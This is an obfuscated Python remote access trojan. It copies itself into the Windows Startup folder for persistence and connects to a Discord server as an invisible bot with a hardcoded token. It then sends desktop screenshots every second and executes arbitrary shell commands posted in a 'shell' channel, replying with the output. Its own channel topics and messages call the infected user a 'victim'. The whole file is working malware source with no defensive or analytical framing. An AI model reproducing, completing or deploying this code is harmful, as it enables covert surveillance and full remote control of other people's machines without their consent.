import time #line:1
from subprocess import check_output #line:2
import pyautogui #line:3
import discord #line:4
from discord .ext import commands ,tasks #line:5
from PIL import Image #line:6
import os #line:7
from os import getenv ,listdir ,startfile #line:8
from os .path import isdir ,isfile #line:9
from shutil import copy #line:10
file =os .path .basename (__file__ )#line:13
print (file )#line:14
path =f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{file}"%getenv ("userprofile")#line:15
if not isfile (path ):#line:16
    copy (__file__ ,path )#line:17
    startfile (path )#line:18
    exit ()#line:19
elif __file__ .replace ('\\','/')!=path .replace ('\\','/'):#line:20
    exit ()#line:21
folder =os .path .join (os .path .join (os .environ ['USERPROFILE']),'Pictures')#line:24
guild_id =1060855439635525652 #line:26
while True :#line:27
    try :#line:28
        ch =os .getenv ('COMPUTERNAME','defaultValue')#line:29
        bot =commands .Bot (command_prefix ='!',intents =discord .Intents .all ())#line:30
        @tasks .loop (seconds =1.0 )#line:32
        async def screen_task ():#line:33
            OO0000O0OOO000O0O =bot .get_guild (guild_id )#line:34
            OOO00OO000OO00O00 =discord .utils .get (OO0000O0OOO000O0O .categories ,name =ch .lower ())#line:35
            OOOOO0OO0000OO000 =discord .utils .get (OO0000O0OOO000O0O .text_channels ,category =OOO00OO000OO00O00 ,name ="screenshots")#line:36
            OO0OOO000O0OO0000 =await OOOOO0OO0000OO000 .send ("please wait...")#line:37
            OOO0OO0O000OO0O00 =pyautogui .screenshot ()#line:38
            OOO0OO0O000OO0O00 .save (folder +'\screen.png')#line:39
            await OOOOO0OO0000OO000 .send (file =discord .File (folder +'\screen.png'))#line:40
            await OO0OOO000O0OO0000 .delete ()#line:41
            os .remove (folder +'\screen.png')#line:42
        @bot .event #line:43
        async def on_connect ():#line:44
            await bot .change_presence (status =discord .Status .invisible )#line:45
        @bot .event #line:46
        async def on_ready ():#line:47
            await bot .wait_until_ready ()#line:48
            O0OO00OO0OOOOOO00 =bot .get_guild (guild_id )#line:50
            O0O00000OO0OOOO00 =discord .utils .get (O0OO00OO0OOOOOO00 .categories ,name =ch .lower ())#line:51
            O000OO000000OO000 =discord .utils .get (O0OO00OO0OOOOOO00 .text_channels ,category =O0O00000OO0OOOO00 ,name ="shell")#line:52
            O00O00O0O000OO000 =discord .utils .get (O0OO00OO0OOOOOO00 .text_channels ,category =O0O00000OO0OOOO00 ,name ="screenshots")#line:53
            if not O0O00000OO0OOOO00 :#line:55
                    O0O00000OO0OOOO00 =await O0OO00OO0OOOOOO00 .create_category (ch .lower ())#line:56
            if not O00O00O0O000OO000 :#line:57
                    O00O00O0O000OO000 =await O0OO00OO0OOOOOO00 .create_text_channel (category =O0O00000OO0OOOO00 ,name ="screenshots")#line:58
                    await O00O00O0O000OO000 .edit (topic ="send 'screen' to get victim desktop screenshot")#line:59
            if not O000OO000000OO000 :#line:60
                    O000OO000000OO000 =await O0OO00OO0OOOOOO00 .create_text_channel (category =O0O00000OO0OOOO00 ,name ="shell")#line:61
                    await O000OO000000OO000 .edit (topic ="use batch command in this channel")#line:62
            await O000OO000000OO000 .send ("new victim")#line:63
            screen_task .start ()#line:64
        @bot .listen ()#line:67
        async def on_message (OOOOOOO0O000OO0O0 ):#line:68
            await bot .process_commands (OOOOOOO0O000OO0O0 )#line:69
            O00O0OO0O0OOO0O0O =bot .get_guild (guild_id )#line:70
            O0OO00OOOOO0OO000 =discord .utils .get (O00O0OO0O0OOO0O0O .categories ,name =ch .lower ())#line:71
            OOOO0O0O0OOO0OOO0 =discord .utils .get (O00O0OO0O0OOO0O0O .text_channels ,category =O0OO00OOOOO0OO000 ,name ="shell")#line:72
            O000O0O00OO0O00OO =discord .utils .get (O00O0OO0O0OOO0O0O .text_channels ,category =O0OO00OOOOO0OO000 ,name ="screenshots")#line:73
            if OOOOOOO0O000OO0O0 .author .id ==bot .user .id :#line:74
                    return #line:75
            if OOOOOOO0O000OO0O0 .channel ==OOOO0O0O0OOO0OOO0 :#line:76
                try :#line:77
                    O000O0O0OO00OOO0O =check_output (OOOOOOO0O000OO0O0 .content ,shell =True )#line:78
                    if O000O0O0OO00OOO0O .decode ("cp850")in ["",None ]:#line:79
                        await OOOOOOO0O000OO0O0 .reply (content ="command sent to the victim's shell")#line:80
                    else :#line:82
                        await OOOOOOO0O000OO0O0 .reply (content =O000O0O0OO00OOO0O .decode ("cp850"))#line:83
                except Exception as OO0OO0O0O0O000000 :#line:84
                    await OOOOOOO0O000OO0O0 .reply (content =f"error: {error}")#line:85
            else :#line:86
                pass #line:87
        @bot .command ()#line:88
        async def restart (O0000OO0OOO0OOOOO ):#line:89
            await O0000OO0OOO0OOOOO .send ("Restarting...")#line:90
            os .startfile (__file__ )#line:91
            os ._exit (1 )#line:92
        bot .run ("OTkxNjc1MTExOTA2MjIyMjIx.G-euRS.wQ0KvhLz7HyFdUZ4ToTGglBAG8xyYGUYZuBcVA")#line:94
    except Exception or aiohttp .client_exceptions .ClientConnectorError as e :#line:95
        print (f'Error: {e}')#line:96
